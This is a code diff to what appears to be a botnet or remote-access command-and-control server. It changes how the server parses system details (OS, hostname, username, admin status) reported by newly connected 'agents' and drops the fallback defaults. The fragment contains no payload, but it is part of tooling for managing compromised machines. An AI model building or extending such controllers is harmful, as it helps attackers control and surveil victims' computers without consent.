@@ -97,26 +97,14 @@ def accept_connections():
                 # Get OS info from client
                 bot.reliable_send('sysinfo')
                 try:
-                    sysinfo = bot.reliable_recv()
-                    if isinstance(sysinfo, str):
-                        # If response is a string, try to parse it as JSON
-                        try:
-                            sysinfo = json.loads(sysinfo)
-                        except json.JSONDecodeError:
-                            sysinfo = {'os': 'Unknown', 'hostname': 'Unknown', 'username': 'Unknown'}
-                    
-                    if isinstance(sysinfo, dict):
-                        bot.os_type = sysinfo.get('os', 'Unknown')
-                        bot.hostname = sysinfo.get('hostname', 'Unknown')
-                        bot.username = sysinfo.get('username', 'Unknown')
-                        bot.is_admin = sysinfo.get('is_admin', False)
-                    
+                    response = bot.reliable_recv()
+                    if response:
+                        bot.os_type = response.get('os', 'Unknown')
+                        bot.hostname = response.get('hostname', 'Unknown')
+                        bot.username = response.get('username', 'Unknown')
+                        bot.is_admin = response.get('is_admin', False)
                 except Exception as e:
                     logging.error(f"Error getting system info: {e}")
-                    bot.os_type = 'Unknown'
-                    bot.hostname = 'Unknown'
-                    bot.username = 'Unknown'
-                    bot.is_admin = False
                 
                 logging.info(f"New agent connected - IP: {ip[0]}:{ip[1]} | OS: {bot.os_type} | Session ID: {bot.id}")
                 print(f"\n[+] New agent connected from {ip[0]}:{ip[1]}")
